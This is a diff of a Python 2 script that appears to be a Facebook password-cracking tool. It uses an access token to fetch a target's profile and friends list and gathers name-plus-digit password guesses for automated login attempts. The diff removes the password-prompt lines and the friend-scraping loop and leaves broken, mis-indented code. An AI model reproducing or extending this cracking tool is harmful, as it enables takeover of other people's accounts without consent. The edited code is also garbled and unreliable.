@@ -402,28 +402,8 @@ def a_s():
         print ''
         print '\033[1;31;1m~~~~ Auto pass public cracking ~~~~'
         print ''
-        print '\033[0;96m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
+        print '\033[0;96m For @efk welcome to my group'
         print ''
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
-        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
-        p6 = raw_input(' \033[1;92m[6]Name + digit: ')
-        p7 = raw_input(' \033[1;92m[7]Name + digit: ')
-        p8 = raw_input(' \033[1;92m[8]Name + digit: ')
-	p9 = raw_input(' \033[1;92m[9]Name + digit: ')
-	pass10 = raw_input('\033[1;92m[10]Password: ')
-	pass11 = raw_input('\033[1;92m[11]Password: ')
-	pass12 = raw_input('\033[1;92m[12]Password: ')
-	pass13 = raw_input('\033[1;92m[13]Password: ')
-	pass14 = raw_input('\033[1;92m[14]Password: ')
-	pass15 = raw_input('\033[1;92m[15]Password: ')
-	pass16 = raw_input('\033[1;92m[16]Password: ')
-	pass17 = raw_input('\033[1;92m[17]Password: ')
-	pass18 = raw_input('\033[1;92m[18]Password: ')
-	pass19 = raw_input('\033[1;92m[19]Password: ')
-	pass20 = raw_input('\033[1;92m[20]Password: ')
         idt = raw_input('\033[0;96m[★]Enter id: ')
         
         try:
@@ -461,37 +441,11 @@ def a_s():
         print ''
         idt = raw_input(' \033[0;96m[★]Enter id: ')
         
-        try:
-
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 
 			q = json.loads(r.text)
 
 			print("[!] Target from : "+q["name"])
-
-		except (KeyError , IOError):
-
-		    print("")
-
-		    print("\033[1;91your login account has checkpoint").center(50)
-
-		    print("")
-
-		    menu()
-
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
-
-		z = json.loads(r.text)
-
-		for i in z["data"]:
-
-			uid=i['id']
-
-			na=i['name']
-
-			nm=na.rsplit(" ")[0]
-
-			id.append(uid+'|'+nm)
             os.system('clear')
             print logo
             print ''
